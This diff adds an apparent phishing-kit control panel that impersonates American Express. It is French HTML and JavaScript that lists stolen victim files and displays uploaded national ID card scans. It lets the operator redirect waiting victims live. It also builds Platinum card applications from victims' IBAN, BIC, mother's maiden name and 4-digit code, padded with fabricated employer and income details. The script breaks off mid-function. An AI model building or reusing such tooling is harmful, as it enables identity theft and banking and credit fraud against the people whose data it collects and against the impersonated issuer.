@@ -1,0 +1,1326 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Panel Admin - American Express</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+        }
+
+        /* Sidebar professionnelle */
+        .sidebar {
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 280px;
+            height: 100%;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            box-shadow: 2px 0 20px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+            z-index: 100;
+        }
+
+        .logo-container {
+            padding: 30px 24px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            margin-bottom: 30px;
+        }
+
+        .logo-container img {
+            width: 180px;
+            height: auto;
+            filter: brightness(0) invert(1);
+        }
+
+        .nav-menu {
+            padding: 0 20px;
+        }
+
+        .nav-item {
+            margin-bottom: 12px;
+        }
+
+        .nav-link {
+            display: flex;
+            align-items: center;
+            padding: 14px 20px;
+            color: rgba(255, 255, 255, 0.7);
+            text-decoration: none;
+            border-radius: 12px;
+            transition: all 0.3s ease;
+            font-weight: 500;
+            gap: 12px;
+        }
+
+        .nav-link:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            transform: translateX(5px);
+        }
+
+        .nav-link.active {
+            background: linear-gradient(135deg, #006FCF, #0050a0);
+            color: white;
+            box-shadow: 0 4px 15px rgba(0, 111, 207, 0.3);
+        }
+
+        .nav-link i {
+            width: 24px;
+            font-size: 1.2rem;
+        }
+
+        /* Contenu principal */
+        .main-content {
+            margin-left: 280px;
+            padding: 30px 40px;
+        }
+
+        /* Header */
+        .top-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            background: white;
+            padding: 20px 30px;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        .page-title {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #1a1a2e;
+        }
+
+        .admin-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .admin-avatar {
+            width: 45px;
+            height: 45px;
+            background: linear-gradient(135deg, #006FCF, #0050a0);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+
+        .admin-name {
+            font-weight: 600;
+            color: #1a1a2e;
+        }
+
+        /* Cartes statistiques */
+        .stats-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+
+        .stat-card {
+            background: white;
+            padding: 25px;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            border-left: 4px solid #006FCF;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+        }
+
+        .stat-title {
+            color: #6c757d;
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+        }
+
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #1a1a2e;
+        }
+
+        /* Rubriques */
+        .rubrique-container {
+            background: white;
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        .rubrique-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #1a1a2e;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #006FCF;
+        }
+
+        /* Tableaux */
+        .data-table {
+            width: 100%;
+            overflow-x: auto;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th {
+            text-align: left;
+            padding: 15px;
+            background: #f8f9fa;
+            color: #495057;
+            font-weight: 600;
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        td {
+            padding: 15px;
+            border-bottom: 1px solid #e9ecef;
+            color: #6c757d;
+        }
+
+        tr:hover {
+            background: #f8f9fa;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        .badge-success {
+            background: #d4edda;
+            color: #155724;
+        }
+
+        .badge-warning {
+            background: #fff3cd;
+            color: #856404;
+        }
+
+        .badge-danger {
+            background: #f8d7da;
+            color: #721c24;
+        }
+
+        .btn-action {
+            background: #006FCF;
+            color: white;
+            border: none;
+            padding: 6px 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: background 0.3s ease;
+        }
+
+        .btn-action:hover {
+            background: #0050a0;
+        }
+
+        .search-bar {
+    margin-bottom: 20px;
+    display: flex;
+    gap: 15px;
+    align-items: center;
+    justify-content: space-between;
+}
+
+.search-bar-wrapper {
+    display: flex;
+    gap: 15px;
+    align-items: center;
+    flex: 1;
+}
+
+.btn-creer {
+    background: linear-gradient(135deg, #006FCF, #0050a0);
+    color: white;
+    border: none;
+    padding: 10px 25px;
+    border-radius: 10px;
+    cursor: pointer;
+    font-size: 0.9rem;
+    font-weight: 600;
+    transition: all 0.3s ease;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    white-space: nowrap;
+}
+
+.btn-creer:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 4px 12px rgba(0, 111, 207, 0.3);
+}
+
+        .search-input {
+            width: 100%;
+            max-width: 300px;
+            padding: 10px 15px;
+            border: 1px solid #dee2e6;
+            border-radius: 10px;
+            font-size: 0.9rem;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+
+        .search-input:focus {
+            border-color: #006FCF;
+        }
+
+        .rubrique-content {
+            display: none;
+        }
+
+        .rubrique-content.active {
+            display: block;
+        }
+
+        @media (max-width: 768px) {
+            .sidebar {
+                transform: translateX(-100%);
+            }
+            .main-content {
+                margin-left: 0;
+                padding: 20px;
+            }
+        }
+
+        /* Modal */
+.modal {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.5);
+    z-index: 1000;
+    justify-content: center;
+    align-items: center;
+}
+
+.modal-content {
+    background: white;
+    width: 90%;
+    max-width: 600px;
+    max-height: 80%;
+    border-radius: 16px;
+    overflow-y: auto;
+    padding: 25px;
+}
+
+.modal-header {
+    position: sticky;
+    top: 0;
+    background: white;
+    padding-bottom: 15px;
+    border-bottom: 2px solid #006FCF;
+    margin-bottom: 20px;
+}
+
+.modal-header h2 {
+    color: #1a1a2e;
+    font-size: 1.3rem;
+}
+
+.amex-link {
+    background: #f0f2f5;
+    padding: 10px;
+    border-radius: 8px;
+    font-size: 0.8rem;
+    word-break: break-all;
+    margin-top: 10px;
+}
+
+.amex-link a {
+    color: #006FCF;
+    text-decoration: none;
+}
+
+.form-group {
+    margin-bottom: 15px;
+}
+
+.form-group label {
+    display: block;
+    margin-bottom: 5px;
+    font-weight: 600;
+    font-size: 0.85rem;
+    color: #333;
+}
+
+.form-group input, .form-group select {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    font-size: 0.9rem;
+}
+
+.form-group input:focus, .form-group select:focus {
+    outline: none;
+    border-color: #006FCF;
+}
+
+.form-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 15px;
+}
+
+.modal-footer {
+    position: sticky;
+    bottom: 0;
+    background: white;
+    padding-top: 15px;
+    margin-top: 20px;
+    border-top: 1px solid #eee;
+    display: flex;
+    gap: 10px;
+    justify-content: flex-end;
+}
+
+.btn-save {
+    background: linear-gradient(135deg, #006FCF, #0050a0);
+    color: white;
+    border: none;
+    padding: 12px 30px;
+    border-radius: 10px;
+    cursor: pointer;
+    font-weight: 600;
+}
+
+.btn-cancel {
+    background: #6c757d;
+    color: white;
+    border: none;
+    padding: 12px 30px;
+    border-radius: 10px;
+    cursor: pointer;
+    font-weight: 600;
+}
+		
+		.btn-delete {
+    background: #dc3545;
+    color: white;
+    border: none;
+    padding: 6px 12px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 0.8rem;
+    margin-left: 5px;
+    transition: background 0.3s ease;
+}
+
+.btn-delete:hover {
+    background: #c82333;
+}
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="sidebar">
+        <div class="logo-container">
+            <img src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-stack.svg" alt="American Express">
+        </div>
+        <div class="nav-menu">
+            <div class="nav-item">
+                <a href="#" class="nav-link active" data-rubrique="dossier">
+                    <i class="fas fa-folder-open"></i>
+                    <span>Dossier Amex</span>
+                </a>
+            </div>
+            <div class="nav-item">
+                <a href="#" class="nav-link" data-rubrique="vicdoc">
+                    <i class="fas fa-file-alt"></i>
+                    <span>VIC/DOC</span>
+                </a>
+            </div>
+            <div class="nav-item">
+                <a href="#" class="nav-link" data-rubrique="redirection">
+                    <i class="fas fa-share"></i>
+                    <span>Redirection</span>
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <div class="top-header">
+            <h1 class="page-title" id="mainTitle">Dossier Amex</h1>
+            <div class="admin-info">
+                <div class="admin-name">
+                    <div>£$IM ADMIN</div>
+                    <small style="color: #6c757d;">Administrateur</small>
+                </div>
+                <div class="admin-avatar">JD</div>
+            </div>
+        </div>
+
+        <div class="stats-cards">
+            <div class="stat-card">
+                <div class="stat-title">Dossiers actifs</div>
+                <div class="stat-value" id="totalDossiers">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-title">Documents en attente</div>
+                <div class="stat-value" id="documentsAttente">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-title">Taux validation</div>
+                <div class="stat-value" id="tauxValidation">0</div>
+            </div>
+        </div>
+
+        <!-- Rubrique Dossier Amex -->
+        <div id="dossierContent" class="rubrique-container rubrique-content active">
+            <div class="rubrique-title">
+                <i class="fas fa-folder-open" style="margin-right: 10px; color: #006FCF;"></i>
+                Gestion des Dossiers Amex
+            </div>
+            <div class="search-bar">
+    <div class="search-bar-wrapper">
+        <input type="text" class="search-input" id="searchDossier" placeholder="Rechercher un dossier...">
+        <button class="btn-creer" onclick="creerDossier()">
+            <i class="fas fa-plus"></i> Créer un dossier
+        </button>
+    </div>
+</div>
+            <div class="data-table">
+                <table id="dossierTable">
+                    <thead>
+                        <tr>
+                            <th>ID Dossier</th>
+                            <th>Client</th>
+                            <th>Email</th>
+                            <th>Statut</th>
+                            <th>Date création</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="dossierTableBody">
+                        <!-- Les données seront chargées ici -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Rubrique VIC/DOC -->
+        <div id="vicdocContent" class="rubrique-container rubrique-content">
+            <div class="rubrique-title">
+                <i class="fas fa-file-alt" style="margin-right: 10px; color: #006FCF;"></i>
+                Vérification des Documents (VIC/DOC)
+            </div>
+            <div class="search-bar">
+                <input type="text" class="search-input" id="searchDoc" placeholder="Rechercher un document...">
+            </div>
+            <div class="data-table">
+                <table id="docTable">
+                    <thead>
+                        <tr>
+                            <th>ID Document</th>
+                            <th>Type</th>
+							<th>Propriétaire</th>
+                            <th>Date dépôt</th>
+                            <th>Statut vérif</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="docTableBody">
+                        <!-- Les données seront chargées ici -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Remplacer tout le contenu de la rubrique Redirection par : -->
+<div id="redirectionContent" class="rubrique-container rubrique-content">
+    <div class="rubrique-title">
+        <i class="fas fa-share" style="margin-right: 10px; color: #006FCF;"></i>
+        Gestion des Redirections
+    </div>
+    <div class="data-table">
+        <table>
+            <thead>
+                <tr>
+                    <th>ID CLIENT</th>
+                    <th>URL SOURCE</th>
+                    <th>URL DESTINATION</th>
+                    <th>STATUS</th>
+                    <th>ACTION</th>
+                </tr>
+            </thead>
+            <tbody id="redirectionTableBody">
+                <!-- Les données seront chargées ici -->
+            </tbody>
+        </table>
+    </div>
+</div>
+    </div>
+	
+	<!-- Modal Créer Dossier -->
+<div id="dossierModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h2>📁 LIEN DOSSIER AMEX</h2>
+            <div class="amex-link">
+                🔗 <a href="https://www.americanexpress.com/fr-fr/charge-cards/apply/personal/platinum?intlink=fr-amex-cardshop-details-apply-CartePlatinumAmericanExpress-siderail" target="_blank">https://www.americanexpress.com/fr-fr/charge-cards/apply/personal/platinum</a>
+            </div>
+        </div>
+
+        <form id="dossierForm">
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Prénom *</label>
+                    <input type="text" id="prenom" required>
+                </div>
+                <div class="form-group">
+                    <label>Nom *</label>
+                    <input type="text" id="nom" required>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Date de Naissance *</label>
+                <input type="date" id="dateNaissance" required>
+            </div>
+
+            <div class="form-group">
+                <label>Email *</label>
+                <input type="email" id="email" required>
+            </div>
+
+            <div class="form-group">
+                <label>Numéro de téléphone *</label>
+                <input type="tel" id="telephone" required>
+            </div>
+
+            <div class="form-group">
+                <label>Ville de naissance *</label>
+                <input type="text" id="villeNaissance" required>
+            </div>
+
+            <div class="form-group">
+                <label>Département de naissance *</label>
+                <input type="text" id="departementNaissance" required>
+            </div>
+
+            <div class="form-group">
+                <label>Adresse de livraison *</label>
+                <input type="text" id="adresseLivraison" required>
+            </div>
+
+            <div class="form-row">
+    <div class="form-group">
+        <label>IBAN *</label>
+        <input type="text" id="iban" placeholder="FR76 XXXX XXXX XXXX XXXX XXXX XXX" required>
+    </div>
+    <div class="form-group">
+        <label>BIC *</label>
+        <input type="text" id="bic" placeholder="Exemple: BNPAFRPP" required>
+    </div>
+</div>
+
+            <div class="form-group">
+    <label>Montant annuel * (en €)</label>
+    <input type="number" id="montantAnnuel" placeholder="Exemple: 125000" required>
+</div>
+
+            <div class="form-group">
+                <label>Catégorie</label>
+                <input type="text" id="categorie" value="Cadres et professions intellectuelle supérieures" readonly>
+            </div>
+
+            <div class="form-group">
+                <label>Profession</label>
+                <input type="text" id="profession" value="Cadre administratif" readonly>
+            </div>
+
+            <div class="form-group">
+                <label>Secteur *</label>
+                <select id="secteur" required>
+                    <option value="">-- Sélectionnez --</option>
+                    <option value="Activités financières et d'assurance">Activités financières et d'assurance</option>
+                    <option value="Industrie manufacturière">Industrie manufacturière</option>
+                </select>
+            </div>
+
+            <div class="form-group" id="boulotGroup">
+    <label>Boulot *</label>
+    <select id="boulot">
+    <option value="">-- Sélectionnez --</option>
+    <option value="Allianz">Allianz</option>
+    <option value="AXA">AXA</option>
+    <option value="Natixis Investment Managers">Natixis Investment Managers</option>
+    <option value="Michelin">Michelin</option>
+    <option value="Philips">Philips</option>
+    <option value="Dyson">Dyson</option>
+    <option value="Sony">Sony</option>
+</select>
+</div>
+
+            <div class="form-group">
+    <label>Ancienneté professionnelle *</label>
+    <select id="anciennete" required>
+        <option value="">-- Sélectionnez --</option>
+        <option value="5 ans">5 ans</option>
+        <option value="6 ans">6 ans</option>
+        <option value="7 ans">7 ans</option>
+        <option value="8 ans">8 ans</option>
+        <option value="9 ans">9 ans</option>
+    </select>
+</div>
+
+            <div class="form-group">
+                <label>Nom de jeune fille de la mère *</label>
+                <input type="text" id="nomJeuneFille" required>
+            </div>
+
+            <div class="form-group">
+                <label>Code à 4 chiffres *</label>
+                <input type="password" id="codeSecret" maxlength="4" pattern="[0-9]{4}" required>
+            </div>
+
+            <div class="modal-footer">
+                <button type="button" class="btn-cancel" onclick="fermerModal()">Annuler</button>
+                <button type="submit" class="btn-save">Enregistrer le dossier Amex</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+    <script>
+		
+		// Charger les redirections
+async function chargerRedirections() {
+    try {
+        const response = await fetch('backend-amex/get-redirections.php');
+        const data = await response.json();
+        
+        if (data.success && data.redirections) {
+            afficherRedirections(data.redirections);
+        }
+    } catch (error) {
+        console.error('Erreur chargement redirections:', error);
+    }
+}
+
+function afficherRedirections(redirections) {
+    const tbody = document.getElementById('redirectionTableBody');
+    
+    if (!redirections || redirections.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="5" style="text-align: center;">Aucune redirection en attente</td></tr>';
+        return;
+    }
+    
+    tbody.innerHTML = redirections.map(r => `
+        <tr data-clientid="${r.clientId}">
+            <td><strong>${r.clientId}</strong></td>
+            <td>${r.sourceUrl}</td>
+            <td>${r.destinationUrl || '-'}</td>
+            <td><span class="badge ${r.status === 'en_attente' ? 'badge-warning' : 'badge-success'}">${r.status === 'en_attente' ? 'En attente' : 'Redirigé'}</span></td>
+            <td>
+                <button class="btn-action" onclick="validerRedirection('${r.clientId}')" ${r.status !== 'en_attente' ? 'disabled' : ''}>Valider</button>
+            </td>
+        </tr>
+    `).join('');
+}
+
+async function validerRedirection(clientId) {
+    const urlDestination = prompt('Vers quelle URL voulez-vous rediriger l\'utilisateur ?\nExemple: https://google.com');
+    
+    if (!urlDestination) return;
+    
+    try {
+        const response = await fetch('backend-amex/update-redirection.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                clientId: clientId,
+                destinationUrl: urlDestination
+            })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            alert('Redirection mise à jour ! L\'utilisateur sera redirigé.');
+            chargerRedirections(); // Recharger la liste
+        } else {
+            alert('Erreur: ' + result.error);
+        }
+    } catch (error) {
+        console.error('Erreur:', error);
+        alert('Erreur de connexion');
+    }
+}
+		
+		// Fonction pour charger les dossiers CNI depuis le dossier /backend-amex/CNI/
+async function chargerDocumentsCNI() {
+    try {
+        const response = await fetch('backend-amex/liste-cni.php');
+        const data = await response.json();
+        
+        if (data.success && data.fichiers) {
+            // Vider le tableau des documents existants
+            documents.length = 0;
+            
+            // Ajouter chaque dossier CNI
+            data.fichiers.forEach((dossier, index) => {
+                documents.push({
+                    id: dossier.hash,
+                    type: 'Carte d\'identité',
+                    owner: '', // Case vide à remplir
+                    date: getRelativeTime(dossier.date),
+                    status: 'Valide',
+                    rectoPath: dossier.recto,
+                    versoPath: dossier.verso,
+                    proprietaire: ''
+                });
+            });
+        }
+        
+        afficherDocuments();
+    } catch (error) {
+        console.error('Erreur chargement CNI:', error);
+    }
+}
+
+// Fonction pour calculer le temps relatif (il y a X minute)
+function getRelativeTime(fileDate) {
+    const now = new Date();
+    const fileTime = new Date(fileDate);
+    const diffMinutes = Math.floor((now - fileTime) / 1000 / 60);
+    
+    if (diffMinutes < 1) return 'à l\'instant';
+    if (diffMinutes === 1) return 'il y a 1 minute';
+    if (diffMinutes < 60) return `il y a ${diffMinutes} minutes`;
+    if (diffMinutes < 120) return 'il y a 1 heure';
+    return `il y a ${Math.floor(diffMinutes / 60)} heures`;
+}
+
+        // Charger les dossiers depuis le serveur
+async function chargerDossiers() {
+    try {
+        const response = await fetch('backend-amex/dossier-amex.php');
+        const data = await response.json();
+        
+        // Vider le tableau des dossiers
+        dossiers.length = 0;
+        
+        // Ajouter les dossiers chargés
+        if (data.dossiers && Array.isArray(data.dossiers)) {
+            data.dossiers.forEach(dossier => {
+                dossiers.push({
+                    id: dossier.id,
+                    client: (dossier.prenom || '') + ' ' + (dossier.nom || ''),
+                    email: dossier.email || '',
+                    status: dossier.status || 'en_attente',
+                    date: dossier.dateCreation || new Date().toISOString().split('T')[0]
+                });
+            });
+        }
+        
+        afficherDossiers();
+    } catch (error) {
+        console.error('Erreur chargement:', error);
+        // Tentative avec chemin relatif
+        try {
+            const response = await fetch('backend-amex/dossier-amex.php');
+            const data = await response.json();
+            if (data.dossiers && Array.isArray(data.dossiers)) {
+                dossiers.length = 0;
+                data.dossiers.forEach(dossier => {
+                    dossiers.push({
+                        id: dossier.id,
+                        client: (dossier.prenom || '') + ' ' + (dossier.nom || ''),
+                        email: dossier.email || '',
+                        status: dossier.status || 'en_attente',
+                        date: dossier.dateCreation || new Date().toISOString().split('T')[0]
+                    });
+                });
+                afficherDossiers();
+            }
+        } catch(e) {
+            console.error('Erreur secondaire:', e);
+        }
+    }
+}
+
+        // Données simulées
+        const dossiers = [];
+
+        const documents = [];
+
+        function getStatusBadge(status) {
+            const statusMap = {
+                'validé': '<span class="badge badge-success">Validé</span>',
+                'en_attente': '<span class="badge badge-warning">En attente</span>',
+                'refusé': '<span class="badge badge-danger">Refusé</span>',
+                'approuvé': '<span class="badge badge-success">Approuvé</span>',
+                'rejeté': '<span class="badge badge-danger">Rejeté</span>'
+            };
+            return statusMap[status] || '<span class="badge badge-warning">Inconnu</span>';
+        }
+
+        function afficherDossiers(recherche = '') {
+    const tbody = document.getElementById('dossierTableBody');
+    const filtres = dossiers.filter(d => 
+        (d.client && d.client.toLowerCase().includes(recherche.toLowerCase())) ||
+        (d.id && d.id.toLowerCase().includes(recherche.toLowerCase()))
+    );
+    
+    tbody.innerHTML = filtres.map(d => `
+        <tr>
+            <td><strong>${d.id}</strong></td>
+            <td>${d.client}</td>
+            <td>${d.email}</td>
+            <td>${getStatusBadge(d.status)}</td>
+            <td>${d.date}</td>
+            <td>
+                <button class="btn-action" onclick="voirDossier('${d.id}')">Voir</button>
+                <button class="btn-delete" onclick="supprimerDossier('${d.id}')"><i class="fas fa-trash"></i> Supprimer</button>
+            </td>
+        </tr>
+    `).join('');
+    
+    document.getElementById('totalDossiers').innerText = dossiers.length;
+    const valides = dossiers.filter(d => d.status === 'validé').length;
+    document.getElementById('tauxValidation').innerText = Math.round((valides / dossiers.length) * 100) || '0';
+}
+
+        function afficherDocuments(recherche = '') {
+    const tbody = document.getElementById('docTableBody');
+    const filtres = documents.filter(d => 
+        (d.id && d.id.toLowerCase().includes(recherche.toLowerCase())) ||
+        (d.type && d.type.toLowerCase().includes(recherche.toLowerCase())) ||
+        (d.owner && d.owner.toLowerCase().includes(recherche.toLowerCase()))
+    );
+    
+    tbody.innerHTML = filtres.map(d => `
+        <tr>
+            <td><strong>${d.id}</strong></td>
+            <td>${d.type}</td>
+            <td>
+                <input type="text" id="owner-${d.id}" value="${d.proprietaire || ''}" 
+                       style="width: 100%; padding: 5px; border: 1px solid #ddd; border-radius: 5px;"
+                       placeholder="Nom du propriétaire">
+            </td>
+            <td>${d.date}</td>
+            <td><span class="badge badge-success">Valide</span></td>
+            <td>
+                <button class="btn-action" onclick="voirCNI('${d.id}')">Voir</button>
+                <button class="btn-delete" onclick="supprimerCNI('${d.id}')"><i class="fas fa-trash"></i></button>
+            </td>
+        </tr>
+    `).join('');
+    
+    // Sauvegarder les propriétaires quand ils changent
+    documents.forEach(d => {
+        const input = document.getElementById(`owner-${d.id}`);
+        if (input) {
+            input.addEventListener('change', function() {
+                d.proprietaire = this.value;
+            });
+        }
+    });
+    
+    const enAttente = documents.filter(d => d.status === 'en_attente').length;
+    document.getElementById('documentsAttente').innerText = documents.length;
+}
+		
+		// Fonction pour voir les photos CNI dans une modale
+function voirCNI(id) {
+    const doc = documents.find(d => d.id === id);
+    if (!doc) return;
+    
+    const modalContent = `
+        <div style="text-align: center;">
+            <h3 style="margin-bottom: 20px;">Document: ${doc.id}</h3>
+            <div style="display: flex; flex-wrap: wrap; gap: 20px; justify-content: center;">
+                <div style="flex: 1; min-width: 250px;">
+                    <strong>Recto CNI</strong>
+                    <img src="${doc.rectoPath}" style="width: 100%; max-width: 300px; border-radius: 10px; margin-top: 10px; border: 2px solid #4DBDC6;">
+                </div>
+                <div style="flex: 1; min-width: 250px;">
+                    <strong>Verso CNI</strong>
+                    <img src="${doc.versoPath}" style="width: 100%; max-width: 300px; border-radius: 10px; margin-top: 10px; border: 2px solid #4DBDC6;">
+                </div>
+            </div>
+            <div style="margin-top: 20px;">
+                <p><strong>Type:</strong> Carte d'identité</p>
+                <p><strong>Date dépôt:</strong> ${doc.date}</p>
+                <p><strong>Statut:</strong> <span class="badge badge-success">Valide</span></p>
+                <p><strong>Propriétaire:</strong> ${doc.proprietaire || 'Non renseigné'}</p>
+            </div>
+        </div>
+    `;
+    
+    // Créer ou réutiliser une modale
+    let modal = document.getElementById('cniModal');
+    if (!modal) {
+        modal = document.createElement('div');
+        modal.id = 'cniModal';
+        modal.className = 'modal';
+        modal.innerHTML = `
+            <div class="modal-content" style="max-width: 800px;">
+                <div class="modal-header">
+                    <h2>📷 CNI - ${id}</h2>
+                </div>
+                <div id="cniModalBody"></div>
+                <div class="modal-footer">
+                    <button type="button" class="btn-cancel" onclick="fermerCNIModal()">Fermer</button>
+                </div>
+            </div>
+        `;
+        document.body.appendChild(modal);
+    }
+    
+    document.getElementById('cniModalBody').innerHTML = modalContent;
+    modal.style.display = 'flex';
+}
+
+function fermerCNIModal() {
+    const modal = document.getElementById('cniModal');
+    if (modal) modal.style.display = 'none';
+}
+
+// Fonction pour supprimer un dossier CNI
+async function supprimerCNI(id) {
+    if (!confirm(`Supprimer définitivement le dossier ${id} ?`)) return;
+    
+    try {
+        const response = await fetch('backend-amex/supprimer-cni.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ hash: id })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            alert('Dossier supprimé avec succès');
+            chargerDocumentsCNI(); // Recharger la liste
+        } else {
+            alert('Erreur: ' + result.error);
+        }
+    } catch (error) {
+        console.error('Erreur:', error);
+        alert('Erreur de connexion');
+    }
+}
+
+        function voirDossier(id) {
+    // Trouver le dossier complet dans le tableau dossiers
+    const dossierComplet = dossiers.find(d => d.id === id);
+    
+    if (!dossierComplet) {
+        alert('Dossier non trouvé');
+        return;
+    }
+    
+    // Recharger depuis le serveur pour avoir toutes les infos
+    fetch('backend-amex/dossier-amex.php')
+        .then(response => response.json())
+        .then(data => {
+            if (data.dossiers && Array.isArray(data.dossiers)) {
+                const dossierServeur = data.dossiers.find(d => d.id === id);
+                if (dossierServeur) {
+                    afficherDetailsDossier(dossierServeur);
+                } else {
+                    alert('Dossier non trouvé sur le serveur');
+                }
+            }
+        })
+        .catch(error => {
+            console.error('Erreur:', error);
+            alert('Erreur lors du chargement des détails');
+        });
+}
+
+function afficherDetailsDossier(dossier) {
+    const content = document.getElementById('voirDossierContent');
+    content.innerHTML = `
+        <div style="grid-column: span 2; background: #f0f2f5; padding: 10px; border-radius: 8px; margin-bottom: 5px;">
+            <strong>📁 INFOS GÉNÉRALES</strong>
+        </div>
+        <div><strong>ID Dossier:</strong></div><div>${dossier.id || ''}</div>
+        <div><strong>Date création:</strong></div><div>${dossier.dateCreation || ''}</div>
+        <div><strong>Statut:</strong></div><div>${getStatusBadge(dossier.status || 'en_attente')}</div>
+        
+        <div style="grid-column: span 2; background: #f0f2f5; padding: 10px; border-radius: 8px; margin: 5px 0;">
+            <strong>👤 IDENTITÉ</strong>
+        </div>
+        <div><strong>Prénom:</strong></div><div>${dossier.prenom || ''}</div>
+        <div><strong>Nom:</strong></div><div>${dossier.nom || ''}</div>
+        <div><strong>Date naissance:</strong></div><div>${dossier.dateNaissance || ''}</div>
+        <div><strong>Ville naissance:</strong></div><div>${dossier.villeNaissance || ''}</div>
+        <div><strong>Dépt naissance:</strong></div><div>${dossier.departementNaissance || ''}</div>
+        <div><strong>Nom jeune fille mère:</strong></div><div>${dossier.nomJeuneFille || ''}</div>
+        
+        <div style="grid-column: span 2; background: #f0f2f5; padding: 10px; border-radius: 8px; margin: 5px 0;">
+            <strong>📞 CONTACT</strong>
+        </div>
+        <div><strong>Email:</strong></div><div>${dossier.email || ''}</div>
+        <div><strong>Téléphone:</strong></div><div>${dossier.telephone || ''}</div>
+        <div><strong>Adresse livraison:</strong></div><div>${dossier.adresseLivraison || ''}</div>
+        
+        <div style="grid-column: span 2; background: #f0f2f5; padding: 10px; border-radius: 8px; margin: 5px 0;">
+            <strong>💰 BANCAIRE & PROFESSION</strong>
+        </div>
+        <div><strong>IBAN:</strong></div><div>${dossier.iban || ''}</div>
+        <div><strong>BIC:</strong></div><div>${dossier.bic || ''}</div>
+        <div><strong>Montant annuel:</strong></div><div>${dossier.montantAnnuel || ''} €</div>
+        <div><strong>Catégorie:</strong></div><div>${dossier.categorie || ''}</div>
+        <div><strong>Profession:</strong></div><div>${dossier.profession || ''}</div>
+        <div><strong>Secteur:</strong></div><div>${dossier.secteur || ''}</div>
+        <div><strong>Boulot:</strong></div><div>${dossier.boulot || ''}</div>
+        <div><strong>Ancienneté:</strong></div><div>${dossier.anciennete || ''}</div>
+        
+        <div style="grid-column: span 2; background: #f0f2f5; padding: 10px; border-radius: 8px; margin: 5px 0;">
+            <strong>🔗 LIEN</strong>
+        </div>
+        <div><strong>Lien dossier:</strong></div><div><a href="${dossier.lienDossier || '#'}" target="_blank" style="color: #006FCF;">Ouvrir le lien</a></div>
+    `;
+    
+    document.getElementById('voirDossierModal').style.display = 'flex';
+}
+
+function fermerVoirModal() {
+    document.getElementById('voirDossierModal').style.display = 'none';
+}
+
+		async function supprimerDossier(id) {
+    if (!confirm(`Êtes-vous sûr de vouloir supprimer le dossier ${id} ?`)) {
+        return;
+    }
+    
+    try {
+        // Récupérer tous les dossiers
+        const response = await fetch('backend-amex/dossier-amex.php');
+        const data = await response.json();
+        
